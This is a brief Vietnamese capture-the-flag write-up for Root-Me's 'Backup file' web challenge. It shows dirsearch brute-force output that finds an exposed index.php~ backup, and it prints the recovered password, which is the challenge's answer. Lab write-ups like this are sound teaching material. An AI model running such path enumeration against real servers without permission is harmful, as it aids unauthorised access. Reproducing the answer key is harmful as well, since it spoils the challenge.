### Link challenge 
> https://www.root-me.org/en/Challenges/Web-Server/Backup-file
### Solution 
- Bài này ta dùng dirsearch bruteforce đường dẫn của liên kết thì thấy 1 file php có giá trị truy cập được `[23:02:01] 200 -  843B  - /web-serveur/ch11/index.php~ `
```
[23:00:35] 403 -  548B  - /web-serveur/ch11/bitrix/.settings.bak                                                                                                       
[23:00:35] 403 -  548B  - /web-serveur/ch11/bitrix/.settings.php.bak                                                                                                   
[23:00:36] 403 -  548B  - /web-serveur/ch11/bitrix/.settings                                                                                                           
[23:00:36] 403 -  548B  - /web-serveur/ch11/bitrix/.settings.php                                                                                                       
[23:00:51] 403 -  548B  - /web-serveur/ch11/clients.sqlite                                                                                                            
[23:01:08] 403 -  548B  - /web-serveur/ch11/customers.sqlite                                                                                                          
[23:01:10] 403 -  548B  - /web-serveur/ch11/data.sqlite                                                                                                               
[23:01:11] 403 -  548B  - /web-serveur/ch11/database.sqlite                 
[23:01:12] 403 -  548B  - /web-serveur/ch11/db.sqlite                       
[23:01:14] 403 -  548B  - /web-serveur/ch11/db1.sqlite                      
[23:01:23] 403 -  548B  - /web-serveur/ch11/dump.sqlite                     
[23:01:33] 403 -  548B  - /web-serveur/ch11/ext/.deps                       
[23:02:01] 200 -  843B  - /web-serveur/ch11/index.php~                      
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/uploader/.project      
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/uploader/.flexProperties
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/uploader/.settings     
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/varien/.actionScriptProperties
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/uploader/.actionScriptProperties
[23:02:14] 403 -  548B  - /web-serveur/ch11/lib/flex/varien/.flexLibProperties

```
- Tải xuống ta thu được mật khẩu 
> OCCY9AcNm1tj